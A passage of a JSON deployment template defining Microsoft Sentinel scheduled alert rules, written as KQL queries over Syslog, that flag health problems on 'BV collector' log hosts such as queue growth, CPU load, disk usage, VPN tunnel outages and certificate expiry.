          "query": "let latency = 0h;   \nlet start_time = 1h;  \nlet start_time_historical = 36h;\nlet end_time = now();\nlet suppression_time=1d;  \nlet description = (table_parameter: (*)){\ntable_parameter\n| extend all_data = pack_all()\n| extend keys = bag_keys(all_data)\n| mv-apply k = keys to typeof(string) on (\n    extend dynamic_entity = parse_json(all_data[k])\n    | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw', strcat(\n        case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n        , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n        , '')\n        ),'')\n        | summarize ExtendedDescription = make_set(ExtendedDescription)\n)\n| extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9013'\n  |parse DisplayName with * 'on ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );\n let PreviousErrors = (Syslog\n  | where TimeGenerated between (ago(latency + start_time_historical) .. start_time) and ingestion_time() > ago(start_time_historical)\n  | where ProcessName=='bvhb'\n  | parse SyslogMessage with * 'rq=' rq ',' * \n  | extend rq = toint(rq)\n  | summarize rq_errors=min(rq) by HostName\n  );\nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb' \n| where HostName !in (RecentAlerts)\n| parse SyslogMessage with * 'rq=' rq ',' * \n| extend rq = toint(rq)\n| summarize arg_max(TimeGenerated, *) by HostName\n| join kind=inner PreviousErrors on HostName\n| extend rq_delta = rq - rq_errors\n| where rq_delta > 1023\n| extend Tags = 'tag: Health'\n|extend ExtendedDescription = strcat('BV collector ', HostName, ' has an rsyslog queue size that has increased over 1 MB in the previous 36 hours, current size is ', rq, 'KB')\n//|summarize arg_max(TimeGenerated, *) by HostName\n|project TimeGenerated, HostName, rq, rq_delta, rq_errors,ExtendedDescription, Tags\n//|extend bv_start_time = TimeGenerated\n//, bv_src_dvc = HostName\n//, sourcetype = 'Syslog'\n//, bv_alarm_type = 'Collector'\n//, bv_alarm_sub_type = 'Collector'\n//, bv_alarm_threshold = '1024'\n//, bv_alarm_value = rq_delta\n|extend bv_start_time = TimeGenerated\n  , bv_mss_category = 'Collector Disruption'\n  , bv_alarm_type = 'Ingestion Health'\n  , bv_alarm_sub_type = 'Rsyslog Queue'\n  , bv_alarm_name = 'BV-9013'\n  , sourcetype = 'Syslog'\n  , bv_alarm_threshold = '1024 KB'\n  , bv_alarm_value = strcat('Rsyslog queue delta of ', rq_delta, 'KB')\n  , bv_severity = 'medium'\n| extend bv_raw = tostring(pack_all(ignore_null = true))\n| invoke description()\n|project-keep bv_* \n, ExtendedDescription\n, Tags\n, sourcetype\n, HostName\n, sourcetype",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT36H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9013: [Health] - BV Collector - Rsyslog Queue Size Issue on {{HostName}}",
            "alertDescriptionFormat": "This alert identifies when a BV collector has an rsyslog queue size that has increased by over 1 MB, displayed in KB.\n{{ExtendedDescription}} Category: Sentinel Usage {{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9017')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9017')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9017: [Health] - BV Collector - Excessive CPU Load",
          "description": "This alert identifies when a BV collector has excessive CPU load MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 0h; \nlet start_time = 4h;   \nlet end_time = now();  \nlet suppression_time=1d;\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9017'\n  |parse DisplayName with * 'on ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );\nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb'\n| where HostName !in (RecentAlerts)\n| extend CpuLoadExtended = extract_all(@\"load=\\d+.\\d+\\s\\d+.\\d+\\s(\\d+.\\d+)\", SyslogMessage)[0]\n| extend CpuLoadExtended = todecimal(CpuLoadExtended)\n| parse SyslogMessage with * 'cpu=' CpuCount ',' *\n| extend CpuCount = todecimal(CpuCount)\n| extend Tags = 'tag: Health'\n| extend CpuLoadAveragebyCpu = CpuLoadExtended / CpuCount\n|summarize over_time_average=avg(CpuLoadAveragebyCpu), arg_max(TimeGenerated, *) by HostName\n|extend over_time_average=round(over_time_average, 3)\n| where over_time_average > 1.49\n|extend ExtendedDescription = strcat('BV collector ', HostName, ' has an average load per cpu of ', over_time_average, ' across a total of ', CpuCount, ' CPUs. This indicates that each CPU is exceeding 100% of its maximum workload across the previous 4 hours.')\n|extend bv_start_time = TimeGenerated\n, bv_mss_category = 'Collector Disruption'\n, bv_alarm_type = 'Ingestion Health'\n, bv_alarm_sub_type = 'CPU Load'\n, bv_alarm_name = 'BV-9017'\n, sourcetype = 'Syslog'\n, bv_alarm_threshold = '1.5'\n, bv_alarm_value = strcat('CPU load average: ', over_time_average)\n, bv_severity = 'high'\n|project-keep TimeGenerated\n, HostName\n, CpuLoadExtended\n, CpuLoadAveragebyCpu\n, CpuCount\n, ExtendedDescription\n, Tags\n, sourcetype\n, over_time_average\n, bv_*",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9017: [Health] - BV Collector - Excessive CPU load on {{HostName}}",
            "alertDescriptionFormat": "This alert identifies when a BV collector has excessive CPU load. \n{{ExtendedDescription}} \nCategory: Sentinel Usage \n{{Tags}}   "
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9019')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9019')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9019: [Health] - BV Collector - OMS Queue Alert",
          "description": "This alert identifies when a BV collector has an OMS queue consistently over 75mb. MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 0h;      \nlet start_time = 2h; \nlet start_time_historical = 36h;   \nlet end_time = now();  \nlet alert_bin = 5m;\nlet suppression_time=1d; \nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9019:'\n  |parse DisplayName with * 'on ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );  \nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb'\n| where HostName !in (RecentAlerts)\n| parse SyslogMessage with * 'oq=' oq ',' * \n| parse SyslogMessage with * 'oc=' oc ',' * \n| extend oq = toint(oq)\n| extend oc = toint(oc)\n| extend oq_oc = oq / oc\n| summarize arg_max(SyslogMessage, *), eventcount=count() by HostName, TimeGenerated\n|project TimeGenerated, ingestion_time(), oq_oc, HostName\n|sort by TimeGenerated asc, HostName asc\n|scan declare (queue_threshold_count:bool, oq_oc1:int, oq_oc2:int, oq_oc3:int, start_time:datetime , end_time:datetime ) with \n(\nstep step1: oq_oc > 74  ;\nstep step2: oq_oc > 74 and step1.oq_oc > 74 and step1.HostName == HostName ;\nstep step3: oq_oc > 74 and step2.oq_oc > 74 and step2.HostName == HostName => queue_threshold_count = true, oq_oc1=step1.oq_oc, oq_oc2=step2.oq_oc, oq_oc3=step3.oq_oc, start_time=step1.TimeGenerated, end_time=step3.TimeGenerated;\n)\n|where queue_threshold_count == true\n| extend ExtendedDescription = strcat('BV Collector ', HostName, ' has an OMS queue of ', oq_oc, 'MB.')\n|summarize arg_max(TimeGenerated, *) by HostName\n| extend Tags = 'tag: Health'\n|extend bv_mss_category = 'Collector Disruption'\n  , bv_alarm_type = 'Ingestion Health'\n  , bv_alarm_sub_type = 'OMS Queue'\n  , bv_alarm_name = 'BV-9019'\n  , sourcetype = 'Syslog'\n  , bv_alarm_value = strcat('OQ OC value: ', oq_oc)\n  , bv_severity = 'medium'\n| extend bv_rule_version = '1.3.5015'\n| extend bv_rule_timestamp = '1709575939.745463'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.3.5015 bv_rule_timestamp: 1709575939.745463'      \n| project bv_end_time = TimeGenerated\n, bv_start_time = start_time\n, bv_alarm_frequency = '5M'\n, bv_alarm_time = now()\n, oq_oc1\n, oq_oc2\n, bv_alarm_threshold = 75\n, ExtendedDescription\n, bv_src_dvc = HostName\n, bv_rule_version\n, bv_rule_timestamp\n, bv_rule_combined_string\n, Tags\n, tag = 'Health'\n, bv_mss_category\n, bv_alarm_type\n, bv_alarm_sub_type\n, bv_alarm_name\n, bv_alarm_value\n, sourcetype",
          "queryFrequency": "PT5M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Host"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9019: [Health] - BV Collector - OMS Queue Alert - {{bv_alarm_value}} MB on {{bv_src_dvc}}",
            "alertDescriptionFormat": "This alert identifies when a BV collector has an OMS queue consistently over 75mb. \n{{ExtendedDescription}} \nCategory: Sentinel Usage \n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9020')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9020')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9020: [Health] - BV Collector - VPN Tunnel Down - Weekly Summary",
          "description": "This alert provides a weekly list of VPN tunnel outages MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 0m;  \nlet start_time = 7d;\nlet end_time = now();\nlet suppression_time=7d;\n      let description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all()\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw', strcat(\n          case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n          , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n          , '')\n          ),'')\n          | summarize ExtendedDescription = make_set(ExtendedDescription)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9020:'\n  |parse DisplayName with * 'ummary ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );  \nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb' \n| where HostName !in (RecentAlerts)\n| parse SyslogMessage with * 'ping0=' ping0 ', ' * 'ping1=' ping1 ',' *\n|where ping0 == '-1' or ping1 == '-1'\n|extend bv_alarm_value = strcat('VPN tunnel 1 status: ', ping0, ' VPN tunnel 2 status: ', ping1)\n//| summarize min(TimeGenerated) , max(TimeGenerated) , SyslogMessage=max(SyslogMessage) by HostName\n| summarize bv_start_time=min(TimeGenerated) , bv_end_time = max(TimeGenerated) , bv_event_count = count(), take_any(bv_alarm_value) , arg_max(SyslogMessage, *) by  HostName\n| extend Tags = 'tag: Health'\n//|extend  sourcetype = 'Syslog'\n//, bv_alarm_type = 'Collector'\n//, bv_alarm_sub_type = 'Collector'\n//, bv_alarm_threshold = '0'\n|extend bv_src_dvc = HostName\n| extend bv_raw = tostring(pack_all(ignore_null = true))\n|extend bv_start_time = TimeGenerated\n  , bv_mss_category = 'Collector Disruption'\n  , bv_alarm_type = 'Ingestion Health'\n  , bv_alarm_sub_type = 'VPN Connection'\n  , bv_alarm_name = 'BV-9020'\n  , sourcetype = 'Syslog'\n  , bv_alarm_threshold = 'At least 1 VPN tunnel offline with -1 status'\n  , bv_alarm_value = strcat('VPN tunnel status ping0= ',ping0, ', ping1=', ping1)\n  , bv_severity = 'low'\n| extend bv_rule_version = '1.3.5015'\n| extend bv_rule_timestamp = '1709575939.7829049'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.3.5015 bv_rule_timestamp: 1709575939.7829049'  \n| invoke description()\n|project-keep bv_* \n  , ExtendedDescription\n  , Tags\n  , sourcetype\n  , HostName\n//|project min_TimeGenerated, max_TimeGenerated, HostName, ExtendedDescription, Tags",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9020: [Health] - BV Collector - VPN Tunnel Down Summary {{HostName}}",
            "alertDescriptionFormat": "This alert provides a weekly summary of VPN tunnel outages. \n{{ExtendedDescription}} \nCategory: Sentinel Usage {{Tags}}\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9012')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9012')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9012: [Health] - BV Collector - Excessive UDP errors",
          "description": "This alert identifies when a BV collector has excessive UDP errors MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 0h; \nlet start_time = 1h; \nlet start_time_historical = 36h;   \nlet end_time = now();  \nlet suppression_time=1d;\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9012:'\n  |parse DisplayName with * 'on ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );\nlet PreviousErrors = (Syslog\n  | where TimeGenerated between (ago(latency + start_time_historical) .. start_time) and ingestion_time() > ago(start_time_historical)\n  | where ProcessName=='bvhb'\n  | parse SyslogMessage with * 'rcverrs=' rcverrs ' ' * \n  | extend rcverrs = toint(rcverrs)\n  | summarize min_errors=min(rcverrs) by HostName\n  );\nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb'\n| where HostName !in (RecentAlerts)\n| parse SyslogMessage with * 'rcverrs=' rcverrs ' ' * \n| extend rcverrs = toint(rcverrs)\n| extend Tags = 'tag: Health'\n| summarize arg_max(TimeGenerated, *) by HostName\n| join kind=inner PreviousErrors on HostName\n| extend ErrorDelta = rcverrs - min_errors\n|where ErrorDelta > 15000\n|extend ExtendedDescription = strcat('BV collector ', HostName, ' has received more than 15,000 errors since the previous day, total error count is ', rcverrs, ' with a difference of ', ErrorDelta)\n|extend bv_start_time = TimeGenerated\n  , bv_mss_category = 'Collector Disruption'\n  , bv_alarm_type = 'Ingestion Health'\n  , bv_alarm_sub_type = 'UDP Errors'\n  , bv_alarm_name = 'BV-9012'\n  , sourcetype = 'Syslog'\n  , bv_alarm_threshold = '15000'\n  , bv_alarm_value = strcat('Error delta of ', ErrorDelta)\n  , bv_severity = 'medium'\n|project-keep TimeGenerated\n  , HostName\n  , rcverrs\n  , min_errors\n  , ExtendedDescription\n  , Tags\n  , bv_*\n  , sourcetype",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT36H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9012: [Health] - BV Collector - Excessive UDP Errors on {{HostName}}",
            "alertDescriptionFormat": "This alert identifies a BV log collector that has had an increase of at least 15,000 UDP errors in a day. \n{{ExtendedDescription}} \nCategory: Sentinel Usage \n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9018')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9018')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9018: [Health] - BV Collector - VPN Certificate",
          "description": "This alert identifies when a BV collector has a VPN certificate that will expire soon MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "Informational",
          "enabled": true,
          "query": "let latency = 0h;\nlet start_time = 1d;\nlet end_time = now();   \nlet suppression_time=1d;\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9018:'\n  |parse DisplayName with * 'on ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  ); \nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb'\n| where HostName !in (RecentAlerts)\n| parse SyslogMessage with * 'openvpn_cert_remaining=' openvpn_cert_remaining ',' * \n| extend openvpn_cert_remaining = toint(openvpn_cert_remaining)\n|where openvpn_cert_remaining < 30\n| extend Tags = 'tag: Health'\n|extend ExtendedDescription = strcat('BV collector ', HostName, ' has a VPN certificate that will expire in  ', openvpn_cert_remaining, ' days')\n|summarize arg_max(TimeGenerated, *) by HostName\n|extend bv_start_time = TimeGenerated\n  , bv_mss_category = 'Collector Disruption'\n  , bv_alarm_type = 'Ingestion Health'\n  , bv_alarm_sub_type = 'VPN Certificate'\n  , bv_alarm_name = 'BV-9018'\n  , sourcetype = 'Syslog'\n  , bv_alarm_threshold = '30'\n  , bv_alarm_value = strcat('VPN Certificate days remaining: ', openvpn_cert_remaining)\n  , bv_severity = 'informational'\n| extend bv_rule_version = '1.2.5015'\n| extend bv_rule_timestamp = '1709575939.725173'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5015 bv_rule_timestamp: 1709575939.725173'\n|project-keep TimeGenerated, HostName, openvpn_cert_remaining, ExtendedDescription, Tags\n  , sourcetype\n  , bv_*",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9018: [Health] - BV Collector - VPN Certificate expiring soon on {{HostName}}",
            "alertDescriptionFormat": "This alert identifies a BV log collector that a VPN certificate that will expire in the next 30 days. {{ExtendedDescription}} Category: Sentinel Usage {{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9016')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9016')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9016: [Health] - BV Collector - Disk Usage Over 90 percent",
          "description": "This alert identifies when a BV collector has disk usage over 90 percent MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 0h;  \nlet start_time = 2h;\nlet end_time = now();  \nlet suppression_time=1d;\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9016'\n  |parse DisplayName with * 'ent ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );\nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb'\n| where HostName !in (RecentAlerts)\n| extend diskusage = extract_all(@\"root=\\/\\S+\\s(\\d+)%\", SyslogMessage)[0]\n| extend diskusage=toint(diskusage)\n| where diskusage > 90\n| extend Tags = 'tag: Health'\n|extend ExtendedDescription = strcat('BV collector ', HostName, ' has disk usage over 90 percent. Current disk usage is ', diskusage, '%')\n| summarize arg_max(TimeGenerated, *) by HostName\n|extend bv_start_time = TimeGenerated\n  , bv_mss_category = 'Collector Disruption'\n  , bv_alarm_type = 'Ingestion Health'\n  , bv_alarm_sub_type = 'Disk Space'\n  , bv_alarm_name = 'BV-9016'\n  , sourcetype = 'Syslog'\n  , bv_alarm_threshold = '90'\n  , bv_alarm_value = strcat('Disk space usage percent: ', diskusage)\n  , bv_severity = 'high'\n|project-keep TimeGenerated, HostName, diskusage, ExtendedDescription, Tags\n, sourcetype\n, bv_*",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9016: [Health] - BV Collector - Disk Usage Over 90 percent {{HostName}}",
            "alertDescriptionFormat": "This alert identifies a BV log collector with disk usage over 90 percent. \n{{ExtendedDescription}} \nCategory: Sentinel Usage \n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9011')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9011')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9011: [Health] - BV Collector - VPN Tunnels Down",
          "description": "This alert identifies when a BV collector has both management VPN tunnels down MITRE:  Category: BV Connector/Health tag: Health",
          "severity": "Low",
          "enabled": true,
          "query": "let latency = 10m;  \nlet start_time = 10m;\nlet end_time = now();\nlet suppression_time=1d;\n      let description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all()\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw', strcat(\n          case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n          , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n          , '')\n          ),'')\n          | summarize ExtendedDescription = make_set(ExtendedDescription)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet RecentAlerts = toscalar(SecurityAlert\n  | where TimeGenerated between (ago(1d) .. now())\n  | where AlertName startswith 'BV-9011:'\n  |parse DisplayName with * 'Down ' HostName\n  |summarize make_set_if(HostName, isnotempty(HostName))\n  );  \nSyslog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProcessName=='bvhb'\n| where HostName !in (RecentAlerts)\n| parse SyslogMessage with * 'ping0=' ping0 ', ' * 'ping1=' ping1 ',' *\n|where ping0 == '-1' and ping1 == '-1'\n| summarize min(TimeGenerated) , max(TimeGenerated) , SyslogMessage=max(SyslogMessage) by HostName\n|extend ExtendedDescription = strcat('BV collector ', HostName, ' has lost connectivity to both VPN tunnels') \n| extend Tags = 'tag: Health'\n| summarize arg_max(max_TimeGenerated, *) by HostName\n| parse SyslogMessage with * 'ping0=' ping0 ', ' * 'ping1=' ping1 ',' *\n|extend  sourcetype = 'Syslog'\n, bv_mss_category = 'Collector Disruption'\n, bv_alarm_type = 'Heartbeat'\n, bv_alarm_sub_type = 'VPN'\n, bv_alarm_name = 'BV-9011'\n, bv_alarm_threshold = '2'\n, bv_alarm_value = strcat('VPN tunnel 1 status: ', ping0, ' VPN tunnel 2 status: ', ping1)\n, bv_severity = 'low'\n| extend bv_start_time = max_TimeGenerated, bv_src_dvc_hostname=HostName\n| extend bv_raw = tostring(pack_all(ignore_null = true))\n| invoke description()\n| extend bv_rule_version = '1.3.5043'\n| extend bv_rule_timestamp = '1710338370.5105593'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.3.5043 bv_rule_timestamp: 1710338370.5105593'\n|project-keep bv_* \n  , ExtendedDescription\n  , Tags\n  , sourcetype\n  , max_TimeGenerated\n  , HostName\n//|project 